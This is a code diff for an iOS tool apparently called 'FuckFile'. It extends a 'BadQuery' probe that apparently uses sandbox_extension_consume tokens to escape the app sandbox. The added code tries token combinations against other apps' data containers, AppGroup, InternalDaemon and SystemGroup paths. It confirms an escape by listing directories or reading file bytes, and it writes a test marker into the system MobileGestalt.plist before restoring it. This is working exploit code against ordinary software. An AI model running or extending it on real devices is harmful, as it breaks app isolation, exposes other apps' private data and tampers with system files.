@@ -4,7 +4,9 @@
 #import "BadQueryProbe.h"
 #import "bad_query.h"
 #import "FFLogger.h"
+#import "MCMManager.h"
 
+#import <CommonCrypto/CommonDigest.h>
 #import <UIKit/UIKit.h>
 #import <dirent.h>
 #import <dlfcn.h>
@@ -20,6 +22,25 @@
 static NSString *const kBadQueryDirectoryName = @"[BadQuery] Escaped";
 
 static NSMutableString *gLog;
+
+static NSString *sha256Hex(NSData *data)
+{
+    if (!data) return @"";
+    unsigned char digest[CC_SHA256_DIGEST_LENGTH] = {0};
+    CC_SHA256(data.bytes, (CC_LONG)data.length, digest);
+    NSMutableString *hex = [NSMutableString stringWithCapacity:CC_SHA256_DIGEST_LENGTH * 2];
+    for (NSUInteger i = 0; i < CC_SHA256_DIGEST_LENGTH; i++)
+        [hex appendFormat:@"%02x", digest[i]];
+    return hex;
+}
+
+// Forward declarations (defined after BadQueryConsumeCombo).
+static int64_t BadQueryConsumeCombo(NSString *targetPath, NSString *group,
+                                    uint64_t flags, uint64_t part, BOOL traversal);
+static NSMutableDictionary *runConfirmedEscape(NSString *name, NSString *path,
+                                               uint64_t flags, uint64_t part,
+                                               BOOL traversal);
+static NSMutableDictionary *runHandleProbe(void);
 
 static NSString *probeRoot(void)
 {
@@ -455,6 +476,102 @@ static NSArray<NSDictionary *> *runVariantMatrix(NSString *targetPath)
     return results;
 }
 
+// ---- text report ---------------------------------------------------------
+// Human-readable plain-text report of the whole probe run, so results can be
+// viewed and shared directly from Files without plist handling.
+static NSString *buildTextReport(NSDictionary *report)
+{
+    NSMutableString *text = [NSMutableString string];
+    [text appendString:@"============================================================\n"];
+    [text appendString:@" FuckFile BadQuery Probe Report\n"];
+    [text appendString:@"============================================================\n"];
+    NSDictionary *env = [report[@"Environment"] isKindOfClass:NSDictionary.class]
+        ? report[@"Environment"] : nil;
+    [text appendFormat:@"Generated       : %@\n", report[@"CreatedAt"]];
+    [text appendFormat:@"SystemVersion   : %@\n", env[@"SystemVersion"] ?: @"?"];
+    [text appendFormat:@"Build           : %@\n", env[@"Build"] ?: @"?"];
+    [text appendFormat:@"Machine         : %@\n", env[@"Machine"] ?: @"?"];
+    [text appendFormat:@"BundleIdentifier: %@\n", env[@"BundleIdentifier"] ?: @"?"];
+    [text appendFormat:@"SacrificeGroup  : %@\n",
+        [report[@"SacrificeGroupConfigured"] boolValue] ? @"configured" : @"not configured"];
+
+    NSArray *results = [report[@"Probes"] isKindOfClass:NSArray.class] ? report[@"Probes"] : @[];
+    [text appendString:@"\n--- [1] Base probes (class 13, part=3, flags=0x800000000, traversal) ---\n"];
+    for (NSDictionary *probe in results) {
+        NSString *status = probe[@"Status"] ?: @"?";
+        [text appendFormat:@"[%@] %@\n      stage=%@  err=%@\n",
+            [status uppercaseString], probe[@"Name"] ?: @"?", probe[@"Stage"] ?: @"",
+            probe[@"Error"] ?: @""];
+    }
+
+    NSArray *matrix = [report[@"VariantMatrix"] isKindOfClass:NSArray.class]
+        ? report[@"VariantMatrix"] : @[];
+    NSUInteger tokenOk = 0;
+    for (NSDictionary *entry in matrix)
+        if ([entry[@"Status"] isEqualToString:@"TOKEN-OK"]) tokenOk++;
+    [text appendFormat:@"\n--- [2] Variant matrix (%lu combos, %lu token-ok) ---\n",
+        (unsigned long)matrix.count, (unsigned long)tokenOk];
+    for (NSDictionary *entry in matrix) {
+        if (![entry[@"Status"] isEqualToString:@"TOKEN-OK"]) continue;
+        [text appendFormat:@"  group=%@  flags=%@  part=%@  traversal=%@\n",
+            entry[@"Group"], entry[@"Flags"], entry[@"Part"], entry[@"Traversal"]];
+    }
+
+    NSArray *confirmed = [report[@"ConfirmedEscapes"] isKindOfClass:NSArray.class]
+        ? report[@"ConfirmedEscapes"] : @[];
+    [text appendString:@"\n--- [3] Confirmed escapes (STRICT: readdir lists / read returns bytes) ---\n"];
+    if (confirmed.count == 0) [text appendString:@"(none)\n"];
+    for (NSDictionary *entry in confirmed) {
+        NSString *status = entry[@"Status"] ?: @"?";
+        [text appendFormat:@"[%@] %@  flags=%@  verify=%@\n",
+            [status uppercaseString], entry[@"Name"] ?: @"?", entry[@"Flags"],
+            entry[@"Verification"] ?: @"-"];
+        if ([entry[@"ChildCount"] isKindOfClass:NSNumber.class])
+            [text appendFormat:@"      children=%lu\n", (unsigned long)[entry[@"ChildCount"] unsignedIntegerValue]];
+        if ([entry[@"BytesRead"] isKindOfClass:NSNumber.class])
+            [text appendFormat:@"      bytesRead=%lu\n", (unsigned long)[entry[@"BytesRead"] unsignedIntegerValue]];
+        if ([entry[@"Handle"] isKindOfClass:NSNumber.class])
+            [text appendFormat:@"      handle=%lld\n", [entry[@"Handle"] longLongValue]];
+        if ([entry[@"OpendirErrno"] isKindOfClass:NSNumber.class])
+            [text appendFormat:@"      opendirErrno=%ld\n", (long)[entry[@"OpendirErrno"] integerValue]];
+        if ([entry[@"ReadOpenErrno"] isKindOfClass:NSNumber.class])
+            [text appendFormat:@"      openErrno=%ld\n", (long)[entry[@"ReadOpenErrno"] integerValue]];
+        if ([entry[@"ReadErrno"] isKindOfClass:NSNumber.class])
+            [text appendFormat:@"      readErrno=%ld\n", (long)[entry[@"ReadErrno"] integerValue]];
+    }
+
+    NSDictionary *handleProbe = [report[@"HandleProbe"] isKindOfClass:NSDictionary.class]
+        ? report[@"HandleProbe"] : nil;
+    [text appendString:@"\n--- [4] Handle semantics probe ---\n"];
+    if (!handleProbe) {
+        [text appendString:@"(not run)\n"];
+    } else {
+        [text appendFormat:@"Handles                    : %@\n", handleProbe[@"Handles"]];
+        [text appendFormat:@"DistinctForDifferentPaths   : %@\n", handleProbe[@"DistinctForDifferentPaths"]];
+        [text appendFormat:@"SameHandleForSamePath       : %@\n", handleProbe[@"SameHandleForSamePath"]];
+    }
+
+    NSDictionary *gestaltWrite = [report[@"GestaltWriteVerify"] isKindOfClass:NSDictionary.class]
+        ? report[@"GestaltWriteVerify"] : nil;
+    [text appendString:@"\n--- [5] MobileGestalt write verification ---\n"];
+    if (!gestaltWrite) {
+        [text appendString:@"(not run)\n"];
+    } else {
+        [text appendFormat:@"Path        : %@\n", gestaltWrite[@"Path"] ?: @"?"];
+        [text appendFormat:@"Writable    : %@\n", gestaltWrite[@"Writable"]];
+        [text appendFormat:@"OpenRW      : %@\n", gestaltWrite[@"OpenRW"]];
+        [text appendFormat:@"WriteBack   : %@\n", gestaltWrite[@"WriteBack"]];
+        [text appendFormat:@"MarkerRead  : %@\n", gestaltWrite[@"MarkerReadBack"]];
+        [text appendFormat:@"Restored    : %@\n", gestaltWrite[@"Restored"]];
+        [text appendFormat:@"SHA256Match : %@\n", gestaltWrite[@"SHA256Match"]];
+    }
+
+    [text appendString:@"\n--- [6] Full step log ---\n"];
+    [text appendString:@"(see BadQuery Probe Log.txt for every step)\n"];
+    [text appendString:@"\n============================================================\n"];
+    return text;
+}
+
 // BadQueryProbeRun: run every probe, write results and a full step log.
 // Synchronous; call from a background queue.
 static void BadQueryProbeRunInternal(void)
@@ -537,17 +654,101 @@ static void BadQueryProbeRunInternal(void)
         // any token-issuance combination that still survives on this build.
         NSArray<NSDictionary *> *matrix = runVariantMatrix(@"/var/mobile/Containers/Data/Application");
 
+        // Confirmed escapes with STRICT verification: every flag is tried for
+        // every target (no early break) and "escaped" requires readdir to
+        // list children or read() to return bytes.
+        NSMutableArray *confirmed = [NSMutableArray array];
+        NSArray<NSDictionary *> *confirmedTargets = @[
+            @{@"Name": @"App Data root",
+              @"Path": @"/var/mobile/Containers/Data/Application"},
+            @{@"Name": @"AppGroup root",
+              @"Path": @"/var/mobile/Containers/Shared/AppGroup"},
+            @{@"Name": @"InternalDaemon root",
+              @"Path": @"/var/mobile/Containers/Data/InternalDaemon"},
+            @{@"Name": @"PluginKitPlugin root",
+              @"Path": @"/var/mobile/Containers/Data/PluginKitPlugin"},
+            @{@"Name": @"MobileGestalt.plist",
+              @"Path": @"/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist"},
+            @{@"Name": @"SystemGroup root",
+              @"Path": @"/var/containers/Shared/SystemGroup"},
+            @{@"Name": @"System Data root",
+              @"Path": @"/var/containers/Data/System"},
+        ];
+        for (NSDictionary *target in confirmedTargets) {
+            for (NSNumber *flag in @[@(0x900000000ULL), @(0x800000000ULL), @(0x8100000000ULL)]) {
+                [confirmed addObject:runConfirmedEscape(target[@"Name"],
+                    target[@"Path"], flag.unsignedLongLongValue, 0, YES)];
+            }
+        }
+
+        // Handle semantics: distinct paths must yield distinct handles.
+        NSDictionary *handleProbe = runHandleProbe();
+
+        // MobileGestalt write verification (only meaningful if read-ok).
+        NSMutableDictionary *gestaltWrite = [NSMutableDictionary dictionary];
+        NSString *gestaltError = nil;
+        NSString *gestaltPath = [[MCMManager sharedManager] mobileGestaltPath:&gestaltError];
+        gestaltWrite[@"Path"] = gestaltPath ?: (gestaltError ?: @"unreachable");
+        if (gestaltPath) {
+            errno = 0;
+            BOOL writable = access(gestaltPath.UTF8String, W_OK) == 0;
+            gestaltWrite[@"Writable"] = @(writable);
+            gestaltWrite[@"WErrno"] = @(writable ? 0 : errno);
+            logStep(writable, @"gestalt W_OK", writable ? @"writable" : [NSString stringWithFormat:@"errno=%d", errno]);
+            errno = 0;
+            int wfd = open(gestaltPath.UTF8String, O_RDWR | O_CLOEXEC | O_NOFOLLOW);
+            gestaltWrite[@"OpenRW"] = @(wfd >= 0);
+            if (wfd < 0) gestaltWrite[@"OpenRWErrno"] = @(errno);
+            if (wfd >= 0) close(wfd);
+            logStep(wfd >= 0, @"gestalt open O_RDWR", wfd >= 0 ? @"opened" : [NSString stringWithFormat:@"errno=%d", errno]);
+
+            NSData *original = [NSData dataWithContentsOfFile:gestaltPath];
+            NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:gestaltPath];
+            if (original && [plist isKindOfClass:NSDictionary.class]) {
+                NSMutableDictionary *modified = [plist mutableCopy];
+                modified[@"FuckFileWriteTest"] = @([[NSDate date] timeIntervalSince1970]);
+                BOOL wrote = [modified writeToFile:gestaltPath atomically:YES];
+                gestaltWrite[@"WriteBack"] = @(wrote);
+                logStep(wrote, @"gestalt write-back", wrote ? @"marker written" : @"write failed");
+                NSDictionary *readBack = [NSDictionary dictionaryWithContentsOfFile:gestaltPath];
+                BOOL markerPresent = [readBack[@"FuckFileWriteTest"] isKindOfClass:NSNumber.class];
+                gestaltWrite[@"MarkerReadBack"] = @(markerPresent);
+                logStep(markerPresent, @"gestalt marker read-back", markerPresent ? @"confirmed" : @"missing");
+                BOOL restored = original ? [original writeToFile:gestaltPath atomically:YES] : NO;
+                gestaltWrite[@"Restored"] = @(restored);
+                logStep(restored, @"gestalt restore", restored ? @"original bytes restored" : @"restore failed");
+                NSData *after = [NSData dataWithContentsOfFile:gestaltPath];
+                BOOL shaOk = after.length && [sha256Hex(after) isEqualToString:sha256Hex(original)];
+                gestaltWrite[@"SHA256Match"] = @(shaOk);
+                logStep(shaOk, @"gestalt SHA-256 verify", shaOk ? @"original intact" : @"MISMATCH");
+                gestaltWrite[@"OriginalSHA256"] = sha256Hex(original);
+            } else {
+                gestaltWrite[@"ParseError"] = @"plist unreadable";
+            }
+        }
+        logStep(gestaltPath != nil, @"gestalt write verification",
+            gestaltPath ? @"complete" : @"path unreachable");
+
         NSDictionary *report = @{
-            @"Version": @2,
+            @"Version": @5,
             @"CreatedAt": NSDate.date,
             @"Environment": environmentInfo(),
             @"Probes": results,
             @"VariantMatrix": matrix,
+            @"ConfirmedEscapes": confirmed,
+            @"HandleProbe": handleProbe,
+            @"GestaltWriteVerify": gestaltWrite,
             @"SacrificeGroupConfigured": @(sacrificeGroupId().length > 0),
         };
         NSString *resultsPath = [probeRoot() stringByAppendingPathComponent:@"BadQuery Probe Results.plist"];
         [report writeToFile:resultsPath atomically:YES];
         logStep(YES, @"write results", resultsPath);
+
+        NSString *textPath = [probeRoot() stringByAppendingPathComponent:@"BadQuery Probe Report.txt"];
+        NSString *textReport = buildTextReport(report);
+        [textReport writeToFile:textPath atomically:YES
+            encoding:NSUTF8StringEncoding error:nil];
+        logStep(YES, @"write text report", textPath);
         logLine(@"==== BadQueryProbe done ====");
 }
 
@@ -667,6 +868,156 @@ static int64_t BadQueryConsumeCombo(NSString *targetPath, NSString *group,
     return handle;
 }
 
+// ---- strict confirmed escape ----------------------------------------------
+// Full chain (consume -> verify) on an explicit matrix combo, with STRICT
+// verification: a directory only counts as escaped when readdir actually
+// lists children, a file only when read() returns bytes. lstat/access alone
+// is NOT proof — the iOS 26.6 sandbox profile allows stat on these paths
+// without any extension.
+static NSMutableDictionary *runConfirmedEscape(NSString *name, NSString *path,
+                                               uint64_t flags, uint64_t part,
+                                               BOOL traversal)
+{
+    NSMutableDictionary *result = [NSMutableDictionary dictionary];
+    result[@"Name"] = name;
+    result[@"Path"] = path;
+    result[@"Flags"] = [NSString stringWithFormat:@"0x%llx", flags];
+    result[@"Part"] = @(part);
+    result[@"Traversal"] = @(traversal);
+
+    logLine([NSString stringWithFormat:@"==== confirmed escape: %@ (%@) flags=0x%llx part=%llu traversal=%d",
+        name, path, flags, part, traversal]);
+
+    int64_t handle = BadQueryConsumeCombo(path,
+        @"systemgroup.com.apple.mobilegestaltcache", flags, part, traversal);
+    if (handle < 0) {
+        result[@"Status"] = @"consume-failed";
+        result[@"Code"] = @(handle);
+        logStep(NO, @"confirmed consume", [NSString stringWithFormat:@"code=%lld", handle]);
+        return result;
+    }
+    result[@"Handle"] = @(handle);
+    logStep(YES, @"confirmed consume", [NSString stringWithFormat:@"handle=%lld", handle]);
+
+    struct stat st = {0};
+    errno = 0;
+    BOOL statOk = lstat(path.fileSystemRepresentation, &st) == 0;
+    result[@"StatOk"] = @(statOk);
+    result[@"StatErrno"] = @(statOk ? 0 : errno);
+    if (!statOk) {
+        result[@"Status"] = @"stat-failed";
+        result[@"Errno"] = @(errno);
+        logStep(NO, @"confirmed lstat", [NSString stringWithFormat:@"errno=%d", errno]);
+        return result;
+    }
+
+    NSString *verification = @"unverified";
+    NSUInteger childCount = 0;
+    if (S_ISDIR(st.st_mode)) {
+        errno = 0;
+        DIR *dir = opendir(path.UTF8String);
+        if (!dir) {
+            result[@"OpendirErrno"] = @(errno);
+            verification = [NSString stringWithFormat:@"opendir-fail-%d", errno];
+            logStep(NO, @"confirmed opendir", [NSString stringWithFormat:@"errno=%d", errno]);
+        } else {
+            struct dirent *de;
+            while ((de = readdir(dir)) != NULL) {
+                if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")) continue;
+                childCount++;
+            }
+            closedir(dir);
+            result[@"ChildCount"] = @(childCount);
+            verification = childCount > 0 ? @"readdir-ok" : @"empty";
+            logStep(childCount > 0, @"confirmed readdir",
+                [NSString stringWithFormat:@"%lu entries", (unsigned long)childCount]);
+        }
+    } else if (S_ISREG(st.st_mode)) {
+        errno = 0;
+        int rfd = open(path.UTF8String, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
+        if (rfd < 0) {
+            result[@"ReadOpenErrno"] = @(errno);
+            verification = [NSString stringWithFormat:@"open-fail-%d", errno];
+            logStep(NO, @"confirmed open O_RDONLY", [NSString stringWithFormat:@"errno=%d", errno]);
+        } else {
+            uint8_t buf[4096];
+            errno = 0;
+            ssize_t n = read(rfd, buf, sizeof(buf));
+            if (n < 0) {
+                result[@"ReadErrno"] = @(errno);
+                verification = [NSString stringWithFormat:@"read-fail-%d", errno];
+                logStep(NO, @"confirmed read", [NSString stringWithFormat:@"errno=%d", errno]);
+            } else {
+                result[@"BytesRead"] = @(n);
+                verification = n > 0 ? @"read-ok" : @"empty-file";
+                logStep(n > 0, @"confirmed read", [NSString stringWithFormat:@"%zd bytes", n]);
+            }
+            close(rfd);
+        }
+    } else {
+        verification = @"special";
+    }
+    result[@"Verification"] = verification;
+
+    BOOL escaped = [verification isEqualToString:@"readdir-ok"] ||
+                    [verification isEqualToString:@"read-ok"];
+    result[@"Status"] = escaped ? @"escaped"
+        : ([verification hasPrefix:@"opendir-fail"] ||
+           [verification hasPrefix:@"open-fail"] ||
+           [verification hasPrefix:@"read-fail"]) ? @"denied"
+        : @"token-but-unreadable";
+    if (escaped) {
+        installEscapedLink([name stringByAppendingString:
+            [NSString stringWithFormat:@" [h%lld p%llu]", handle, part]], path);
+        logStep(YES, @"confirmed escape",
+            [NSString stringWithFormat:@"%@ verification=%@", name, verification]);
+    } else {
+        logStep(NO, @"confirmed escape",
+            [NSString stringWithFormat:@"%@ verification=%@", name, verification]);
+    }
+    return result;
+}
+
+// ---- handle semantics probe ------------------------------------------------
+// sandbox_extension_consume on two different paths must return two different
+// handles; consuming the same path twice should return the same handle
+// (deduplication). A constant handle across different paths means consume is
+// not really activating anything.
+static NSMutableDictionary *runHandleProbe(void)
+{
+    NSMutableDictionary *result = [NSMutableDictionary dictionary];
+    logLine(@"==== handle probe: does consume return distinct handles? ====");
+    NSArray<NSString *> *paths = @[
+        @"/var/mobile/Containers/Data/Application",
+        @"/var/mobile/Containers/Data/InternalDaemon",
+        @"/var/mobile/Containers/Data/Application",
+    ];
+    NSMutableArray *handles = [NSMutableArray array];
+    for (NSString *path in paths) {
+        int64_t h = BadQueryConsumeCombo(path,
+            @"systemgroup.com.apple.mobilegestaltcache", 0x900000000ULL, 0, YES);
+        [handles addObject:@(h)];
+        logStep(h >= 0, @"handle probe consume",
+            [NSString stringWithFormat:@"%@ -> %lld", path, h]);
+    }
+    result[@"Handles"] = handles;
+    BOOL distinct = [handles[0] isKindOfClass:NSNumber.class] &&
+                    [handles[1] isKindOfClass:NSNumber.class] &&
+                    [handles[0] longLongValue] != [handles[1] longLongValue];
+    BOOL dedup = [handles[0] isKindOfClass:NSNumber.class] &&
+                 [handles[2] isKindOfClass:NSNumber.class] &&
+                 [handles[0] longLongValue] == [handles[2] longLongValue];
+    result[@"DistinctForDifferentPaths"] = @(distinct);
+    result[@"SameHandleForSamePath"] = @(dedup);
+    logStep(distinct, @"handle probe distinct",
+        distinct ? @"different paths -> different handles"
+                 : @"different paths -> SAME handle (consume not activating?)");
+    logStep(dedup, @"handle probe dedup",
+        dedup ? @"same path -> same handle (deduplicated)"
+              : @"same path -> different handle");
+    return result;
+}
+
 int64_t BadQueryConsumePath(NSString *path, NSString *groupIdentifier,
                             BOOL isGroup, NSString **error)
 {
@@ -741,8 +1092,9 @@ int64_t BadQueryConsumePath(NSString *path, NSString *groupIdentifier,
         }
     }
     if (error)
-        *error = [NSString stringWithFormat:@"bad_query failed (code=%lld: %@)",
-            handle, BadQueryCodeText(handle)];
+        *error = [NSString stringWithFormat:
+            @"bad_query failed (code=%lld: %@) and all %lu matrix combos also failed",
+            handle, BadQueryCodeText(handle), (unsigned long)combos.count];
     return handle;
 }
 
